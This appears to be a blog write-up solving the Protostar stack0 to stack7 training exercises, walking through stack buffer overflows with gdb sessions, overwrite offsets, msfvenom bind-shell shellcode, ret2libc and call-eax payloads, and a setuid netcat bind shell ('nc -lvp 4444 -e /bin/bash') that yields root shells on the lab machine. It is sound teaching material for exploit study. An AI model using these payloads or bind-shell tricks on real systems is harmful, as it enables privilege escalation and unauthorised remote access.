+++
author = "pwntester"
categories = ["protostar", "stack0", "stack1", "stack2", "stack4", "stack5", "stack6", "stack7", "stack3"]
date = 2013-12-17T20:39:00Z
description = ""
draft = false
slug = "protostar-stack0-7-write-up"
tags = ["protostar", "stack0", "stack1", "stack2", "stack4", "stack5", "stack6", "stack7", "stack3"]
title = "Protostar stack0-7 write-up"

+++

## Stack0
In [Stack0](http://www.exploit-exercises.com/protostar/stack0) we need to exploit the following program:

```lang-clike line-numbers 
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>

int main(int argc, char **argv)
{
  volatile int modified;
  char buffer[64];

  modified = 0;
  gets(buffer);

  if(modified != 0) {
    printf("you have changed the 'modified' variable\n");
  } else {
    printf("Try again?\n");
  }
}
```

Since **modified** variable is between saved **EBP** and **buffer** any character overflowing **buffer** will change **modified**:

```lang-bash line-numbers 
user@protostar:~$ echo `python -c 'print("A"*64)'` | /opt/protostar/bin/stack0
Try again?
user@protostar:~$ echo `python -c 'print("A"*65)'` | /opt/protostar/bin/stack0
you have changed the 'modified' variable
```

##Stack1
[Stack1](http://www.exploit-exercises.com/protostar/stack1) is similar but now we have to set modified to the hexadecimal value: 0x61626364

```lang-clike line-numbers 
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
  volatile int modified;
  char buffer[64];

  if(argc == 1) {
    errx(1, "please specify an argument\n");
  }

  modified = 0;
  strcpy(buffer, argv[1]);

  if(modified == 0x61626364) {
    printf("you have correctly got the variable to the right value\n");
  } else {
    printf("Try again, you got 0x%08x\n", modified);
  }
}
```

Solution:
```lang-bash line-numbers 
user@protostar:~$ /opt/protostar/bin/stack1 `python -c 'print("A"*64 + "\x64\x63\x62\x61")'`
you have correctly got the variable to the right value
```

##Stack2
[Stack2](http://www.exploit-exercises.com/protostar/stack2) gives us the following code:

```lang-clike line-numbers 
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
  volatile int modified;
  char buffer[64];
  char *variable;

  variable = getenv("GREENIE");

  if(variable == NULL) {
    errx(1, "please set the GREENIE environment variable\n");
  }

  modified = 0;

  strcpy(buffer, variable);

  if(modified == 0x0d0a0d0a) {
    printf("you have correctly modified the variable\n");
  } else {
    printf("Try again, you got 0x%08x\n", modified);
  }

}
```

Solution:
```lang-bash line-numbers 
user@protostar:~$ export GREENIE=`python -c 'print("A"*64 + "\x0a\x0d\x0a\x0d")'`
user@protostar:~$ /opt/protostar/bin/stack2
you have correctly modified the variable
```

#Stack3

[Stack3](http://www.exploit-exercises.com/protostar/stack3) gives us the following code:

```lang-clike line-numbers 
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void win()
{
  printf("code flow successfully changed\n");
}

int main(int argc, char **argv)
{
  volatile int (*fp)();
  char buffer[64];

  fp = 0;

  gets(buffer);

  if(fp) {
    printf("calling function pointer, jumping to 0x%08x\n", fp);
    fp();
  }
}
```

This time its different, we need to call the **win()** function, so we need to overwrite **fp** with the **win()** address. We will get the address using gdb and then set up the explot to overwrite **modified** with **win()** address:

```lang-bash line-numbers 
user@protostar:~$ gdb -q /opt/protostar/bin/stack3
Reading symbols from /opt/protostar/bin/stack3...done.
(gdb) print win
$1 = {void (void)} 0x8048424 <win>
(gdb) quit
user@protostar:~$ echo `python -c 'print("A"*64 + "\x24\x84\x04\x08")'` > stack3
user@protostar:~$ /opt/protostar/bin/stack3 < stack3
calling function pointer, jumping to 0x08048424
code flow successfully changed
```

##Stack4
[Stack4](http://www.exploit-exercises.com/protostar/stack4) gives us the following code to exploit:

```lang-clike line-numbers 
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void win()
{
  printf("code flow successfully changed\n");
}

int main(int argc, char **argv)
{
  char buffer[64];

  gets(buffer);
}
```

We need to overwrite **EIP** with **win()** address which is: **0x80483f4**

```lang-bash line-numbers 
user@protostar:~$ gdb -q /opt/protostar/bin/stack4
Reading symbols from /opt/protostar/bin/stack4...done.
(gdb) print win
$1 = {void (void)} 0x80483f4 <win>
```

So in theory, we need a payload of 64 bytes and then 4 to overwrite **EBP** and 4 more to overwrite **EIP**, but if we run the following line, no segmentation fault is thrown:

```lang-bash line-numbers 
user@protostar:~$ echo `python -c 'print("A"*64 + "AAAA" + "BBBB")'` | /opt/protostar/bin/stack4
```

That is because the compiler will do his crazy stuff and align buffers in unexpected ways so **EIP** can be further than we think, so we will be using metasploit framework to find the right offset:

```lang-bash line-numbers 
alvaro@winterfell /u/l/s/m/tools> ./pattern_create.rb 100
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
```

```lang-bash line-numbers 
user@protostar:~$ echo "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A" > stack4
user@protostar:~$
user@protostar:~$
user@protostar:~$ gdb -q /opt/protostar/bin/stack4Reading symbols from /opt/protostar/bin/stack4...done.
(gdb) run < stack4
Starting program: /opt/protostar/bin/stack4 < stack4

Program received signal SIGSEGV, Segmentation fault.
0x63413563 in ?? ()
```

Offset is **0x63413563** that corresponds to:

```lang-bash line-numbers 
alvaro@winterfell /u/l/s/m/tools> ./pattern_offset.rb 0x63415663
76
```

So our payload should be shifted 76 bytes from the start of the **buffer**.

```lang-bash line-numbers 
user@protostar:~$ echo `python -c 'print("A"*76 + "\xf4\x83\x04\x08")'` | /opt/protostar/bin/stack4
code flow successfully changed
Segmentation fault
```

##Stack5
[Stack5](http://www.exploit-exercises.com/protostar/stack5) gives us the following code to exploit:

```lang-clike line-numbers 
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
  char buffer[64];

  gets(buffer);
}
```

So its basically the same program than stack4 but this time they ask us to use a shellcode. Im not a shellcode writer so I will be using msf to generate a valid shellcode for this architecture:

```lang-bash line-numbers 
alvaro@winterfell /u/l/s/metasploit-framework> ./msfvenom -p linux/x86/shell_bind_tcp -b '\x0d\x0a\x00\xff' -f pl
[*] x86/shikata_ga_nai succeeded with size 105 (iteration=1)
my $buf =
"\xbd\x9b\x77\x1c\xf3\xdd\xc0\xd9\x74\x24\xf4\x5b\x29\xc9" .
"\xb1\x14\x31\x6b\x14\x83\xeb\xfc\x03\x6b\x10\x79\x82\x2d" .
"\x28\x8a\x8e\x1d\x8d\x27\x3b\xa0\x98\x26\x0b\xc2\x57\x28" .
"\x37\x55\x3a\x40\xca\x69\xab\xcc\xa0\x79\x9a\xbc\xbd\x9b" .
"\x76\x5a\xe6\x96\x07\x2b\x57\x2d\xbb\x2f\xe8\x4b\x76\xaf" .
"\x4b\x24\xee\x62\xcb\xd7\xb6\x16\xf3\x8f\x85\x66\x42\x49" .
"\xee\x0e\x7a\x86\x7d\xa6\xec\xf7\xe3\x5f\x83\x8e\x07\xcf" .
"\x08\x18\x26\x5f\xa5\xd7\x29";
```

We will be using a large payload that is bigger than our buffer so we have toplace it in a different location like a environment variable. We can also check how many bytes we can overwrite after passing **EIP**

```lang-bash line-numbers 
user@protostar:~$ echo `python -c 'print("A"*76 + "B"*4 + "C"*120)'` > stack5
user@protostar:~$ gdb -q /opt/protostar/bin/stack5Reading symbols from /opt/protostar/bin/stack5...done.
(gdb) run < stack5
Starting program: /opt/protostar/bin/stack5 < stack5

Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()
(gdb) x/10s $esp
0xbffff7c0:	 'C' <repeats 120 times>
0xbffff839:	 ""
0xbffff83a:	 ""
0xbffff83b:	 ""
0xbffff83c:	 "1\203\004\b\304\203\004\b\001"
0xbffff846:	 ""
0xbffff847:	 ""
0xbffff848:	 "d\370\377\277\360\203\004\b\340\203\004\b@\020\377\267\\\370\377\277\370\370\377\267\001"
0xbffff862:	 ""
0xbffff863:	 ""
(gdb)
```

Nice! Our 120 "C"s are there (we put some more of the 105 bytes required to allocate a NOP sled)

Ok, so lets craft the payload:

```lang-bash line-numbers 
user@protostar:~$ echo `python -c 'print("A"*76 + "\xc0\xf7\xff\xbf" + "\x90"*16 + "\xbd\x9b\x77\x1c\xf3\xdd\xc0\xd9\x74\x24\xf4\x5b\x29\xc9\xb1\x14\x31\x6b\x14\x83\xeb\xfc\x03\x6b\x10\x79\x82\x2d\x28\x8a\x8e\x1d\x8d\x27\x3b\xa0\x98\x26\x0b\xc2\x57\x28\x37\x55\x3a\x40\xca\x69\xab\xcc\xa0\x79\x9a\xbc\xbd\x9b\x76\x5a\xe6\x96\x07\x2b\x57\x2d\xbb\x2f\xe8\x4b\x76\xaf\x4b\x24\xee\x62\xcb\xd7\xb6\x16\xf3\x8f\x85\x66\x42\x49\xee\x0e\x7a\x86\x7d\xa6\xec\xf7\xe3\x5f\x83\x8e\x07\xcf\x08\x18\x26\x5f\xa5\xd7\x29")'` | /opt/protostar/bin/stack5
```

Now from a different terminal:

```lang-bash line-numbers 
$ nc localhost 4444
id
uid=1001(user) gid=1001(user) euid=0(root) groups=0(root),1001(user)
```


##Stack6
[Stack6](http://www.exploit-exercises.com/protostar/stack6) gives us the following code to exploit:

```lang-clike line-numbers 
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void getpath()
{
  char buffer[64];
  unsigned int ret;

  printf("input path please: "); fflush(stdout);

  gets(buffer);

  ret = __builtin_return_address(0);

  if((ret & 0xbf000000) == 0xbf000000) {
    printf("bzzzt (%p)\n", ret);
    _exit(1);
  }

  printf("got path %s\n", buffer);
}

int main(int argc, char **argv)
{
  getpath();
}
```

The program is similar to **stack5** but in this case we are not allowed to jump to stack addresses (0xbf000000) so we cannot place our payload there. Chances are:
- Place it on an enviroment variable
- ret2libc
- ROP
- jmp esp
- ...

First approach is to place the payload in an environment varaible, we will need to know the address of our varaible to jump there. We can use this program for that:

```lang-clike line-numbers 
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
int main(int argc, char *argv[]) {
	char *ptr;
	if(argc < 3) {
		printf("Usage: %s <environment variable> <target program name>\n", argv[0]);
		exit(0);
	}
	ptr = getenv(argv[1]); /* get env var location */
	ptr += (strlen(argv[0]) - strlen(argv[2]))*2; /* adjust for program name */
	printf("%s will be at %p\n", argv[1], ptr);
}
```

We will be using the same shellcode than in stack5:

```lang-bash line-numbers 
user@protostar:~$ export SHELLCODE=\xbd\x9b\x77\x1c\xf3\xdd\xc0\xd9\x74\x24\xf4\x5b\x29\xc9\xb1\x14\x31\x6b\x14\x83\xeb\xfc\x03\x6b\x10\x79\x82\x2d\x28\x8a\x8e\x1d\x8d\x27\x3b\xa0\x98\x26\x0b\xc2\x57\x28\x37\x55\x3a\x40\xca\x69\xab\xcc\xa0\x79\x9a\xbc\xbd\x9b\x76\x5a\xe6\x96\x07\x2b\x57\x2d\xbb\x2f\xe8\x4b\x76\xaf\x4b\x24\xee\x62\xcb\xd7\xb6\x16\xf3\x8f\x85\x66\x42\x49\xee\x0e\x7a\x86\x7d\xa6\xec\xf7\xe3\x5f\x83\x8e\x07\xcf\x08\x18\x26\x5f\xa5\xd7\x29
user@protostar:~$ gcc envaddr.c -o envaddr
user@protostar:~$ chmod +x envaddr
user@protostar:~$ ./envaddr SHELLCODE
SHELLCODE is at address 0xbffff877
```

Oh, damn it! its in the stack address space so it wont work. Lets try the retlibc approach. Here we have a number of options. We can execute **system("/bin/bash")** but as we are exploiting a suid binary, we will drop priviledges. The other options is to use **execl(“/bin/bash”, “/bin/bash”, 0)**. The problem with this approach is that we cannot inject the **"0"** since **gets()** would consider it as the end of the user input. There is a technique to avoid this. We can use **printf** to write the **\x00** for us in the right position using **%n**

If you are not familiar with **ret2libc** this is how it works. You overwrite the return address with a libc function so it gets executed. At the end of the libc function, there will be a **ret** instruction that will pop the next 4 bytes in the stack and transfer the exceution to the address popped. Its important to note that when the **libc** function starts its execution it will expect its arguments in the regular position, thats it, after the ret address. So we have to prepare the stack like:

```lang-bash line-numbers 
--------------------------------------------------------------------------------------------------------------------
| buffer | overwritten EBP | libc function address | return address for libc function | arguments to libc function |
--------------------------------------------------------------------------------------------------------------------
```

We can concatenate different calls by replacing the "return address for libc function" with a second function address. In that case the arguments for that second function should be 4 bytes above the address of the second function.

Ok, enough theory, we will be using two concatenated calls. The first one will be **prinntf** and we will use it to write a **0** in the stack, the one we need for our second call to **execl(“/bin/bash”, “/bin/bash”, 0)**

So, the payload should look like this:

```lang-bash line-numbers 
----------------------------------------------------------------------
| buffer | BBBB | &printf | &execl | &"%3$n" | &"nc" | &"nc" | CCCC |
----------------------------------------------------------------------
```

Where BBBB and CCCC will be random values. BBBB will overwrite EBP and CCCC will be overwritten by the **printf("%3$n")**

We need to place to strings in memory. we can use our buffer for that or simply put them in environment variables:

```lang-bash line-numbers 
user@protostar:~$ export PRINTF="%3\$n"
user@protostar:~$ export NC="bind.sh"
user@protostar:~$ ./envaddr NC /opt/protostar/bin/stack6
NC will be at 0xbffff9cf
user@protostar:~$ ./envaddr PRINTF /opt/protostar/bin/stack6
PRINTF will be at 0xbffff983
```

I will be executing a nc daemon sending a shell and listening on port 4444:

```lang-bash line-numbers 
user@protostar:~$ cat bind.sh
nc -lvp 4444 -e /bin/bash
user@protostar:~$ chmod +x bind.sh
user@protostar:~$ export PATH=/home/user:$PATH
```

```lang-bash line-numbers 
user@protostar:~$ gdb -q /opt/protostar/bin/stack6
Reading symbols from /opt/protostar/bin/stack6...done.
(gdb) b main
Breakpoint 1 at 0x8048500: file stack6/stack6.c, line 27.
(gdb) run
Starting program: /opt/protostar/bin/stack6

Breakpoint 1, main (argc=1, argv=0xbffff6f4) at stack6/stack6.c:27

(gdb) print execl
$1 = {<text variable, no debug info>} 0xb7f2e460 <*__GI_execl>
(gdb) print printf
$2 = {<text variable, no debug info>} 0xb7eddf90 <__printf>
```

Ok, now we have all we need:

buffer: "A"*76
EBP: "BBBB"
&printf: \x90\xdf\xed\xb7
&execl: \x60\xe4\xf2\xb7
&"%3$n": \x60\xf8\xff\xbf
&"nc": \xe4\xf9\xff\xbf

Unfortunately the exploit did not work and after adjunting the buffer address and env variables with detail, it still throws a segmentation fault during the execution of the **execl** system function. After debugging it with **gdb** it looks like all the variables are set ok on our buffer and all of them point to the right functions/strings. Stepping through the code we can see that the **printf** trick works and we are moved into the **execl** with the right parameters. However we get a **segmentation fault** that I cannot explain so I decided to take a different road to get a more stable exploit. This is the last payload I tried:

```lang-bash line-numbers 
user@protostar:~$ echo `python -c 'print("A"*76 + "B"*4 + "\x90\xdf\xed\xb7" + "\x60\xe4\xf2\xb7" + "\x8f\xff\xff\xbf" + "\x75\xff\xff\xbf" + "\x75\xff\xff\xbf" + "\x90\xf7\xff\xbf")'` > stack6
```

Ok, so whats the new road??? I will simple call **system()** to execute a binary that will restore the setuid priviledges. Our payload should look like this:

```lang-bash line-numbers 
-------------------------------------------------------------
| buffer | BBBB | &system | &exit | &"/home/user/bindshell" |
-------------------------------------------------------------
```

We will use the following priviledges restore netcat daemon:

```lang-clike line-numbers 
#include <stdlib.h>

int main(int argc, char **argv, char **envp) {
	// These two are necessary, as system() drops privileges
    setuid(0);
    setgid(0);
    char *args[] = {  "nc", "-nvlp 4444", "-e/bin/sh", (char *) 0 };
    execve("/bin/nc", args, envp);
}
```

Ok, now lets go for **system()** and **exit()** addresses:

```lang-bash line-numbers 
user@protostar:~$ gdb -q /opt/protostar/bin/stack6
Reading symbols from /opt/protostar/bin/stack6...done.
(gdb) b main
Breakpoint 1 at 0x8048500: file stack6/stack6.c, line 27.
(gdb) run
Starting program: /opt/protostar/bin/stack6

Breakpoint 1, main (argc=1, argv=0xbffff804) at stack6/stack6.c:27
(gdb) p system
$1 = {<text variable, no debug info>} 0xb7ecffb0 <__libc_system>
(gdb) p exit
$2 = {<text variable, no debug info>} 0xb7ec60c0 <*__GI_exit>
```

and lastly for our string address:

```lang-bash line-numbers 
user@protostar:~$ export BINDSHELL=/////////////////////////////////////home/user/bindshell
user@protostar:~$ ./envaddr BINDSHELL /opt/protostar/bin/stack6
BINDSHELL will be at 0xbffff962
```

Now, the exploit should look like:

```lang-bash line-numbers 
user@protostar:~$ echo `python -c 'print("A"*76 + "B"*4 + "\xb0\xff\xec\xb7" + "\xc0\x60\xec\xb7" + "\x62\xf9\xff\xbf")'` | /opt/protostar/bin/stack6
input path please: got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA���AAAAAAAABBBB����`�b���
listening on [any] 4444 ...
```

Now from a different terminal:

```lang-bash line-numbers 
user@protostar:~$ nc localhost 4444
id
uid=0(root) gid=0(root) groups=0(root),1001(user)
```

##Stack7
[Stack7](http://www.exploit-exercises.com/protostar/stack7) gives us the following code to exploit:

```lang-clike line-numbers 
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

char *getpath()
{
  char buffer[64];
  unsigned int ret;

  printf("input path please: "); fflush(stdout);

  gets(buffer);

  ret = __builtin_return_address(0);

  if((ret & 0xb0000000) == 0xb0000000) {
    printf("bzzzt (%p)\n", ret);
    _exit(1);
  }

  printf("got path %s\n", buffer);
  return strdup(buffer);
}

int main(int argc, char **argv)
{
  getpath();
}
```

Code is very similar but this time we are asked to use **ret2text**. That basically means to reuse the hex bytes stored in **.text** as opcodes. We can search the .text section for useful gadgets like **jmp esp** that will allow us to ret to those opcodes and then jump back to **esp** successfully bypassing the program control (0xbf000000).

```lang-clike line-numbers 
user@protostar:~$ objdump -M intel -d /opt/protostar/bin/stack7 | grep "call.*esp"
user@protostar:~$ objdump -M intel -d /opt/protostar/bin/stack7 | grep "jmp.*esp"
```

No luck :( We can also use **ret** or **pop, ret** to jump to the stack section above the overwritten EIP address. But if we look at the code we can see that the only difference from **stack6** is that now the **getpath()** function returns **strdup(buffer)** that means that is going to duplicate whatever string it finds at **&buffer** and return the address for that new string. Functions normally return its output using the **eax** registry. So we can place our shellcode at **buffer** and then overwrite the **ret** address with the address of ***call eax** opcodes in **.text**. That way, we will jump to eax where our shellcode will be waiting for us. The only limitation is that our shellcode needs to be smaller than 80 bytes where we need to place the address to **call eax**:

```lang-clike line-numbers 
user@protostar:~$ objdump -M intel -d /opt/protostar/bin/stack7 | grep "call.*eax"
 8048478:	ff 14 85 5c 96 04 08 	call   DWORD PTR [eax*4+0x804965c]
 80484bf:	ff d0                	call   eax
 80485eb:	ff d0                	call   eax
```

We will be using a [shellcode](http://www.exploit-db.com/exploits/13357) that returns from stdin in **gets()** and executes **/bin/sh**
As the return address we will be using the **cal eax** at: 0x080484bf

```lang-bash line-numbers 
user@protostar:~$ echo `python -c 'print("\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80" + "\x90"*25 + "\xbf\x84\x04\x08")'` | /opt/protostar/bin/stack7
input path please: got path 1�1۰̀Sh/ttyh/dev��1�f�'�1�Ph//shh/bin��PS�ᙰ
                                                                       ̀������������������������
# id
uid=1001(user) gid=1001(user) euid=0(root) groups=0(root),1001(user)
#
```









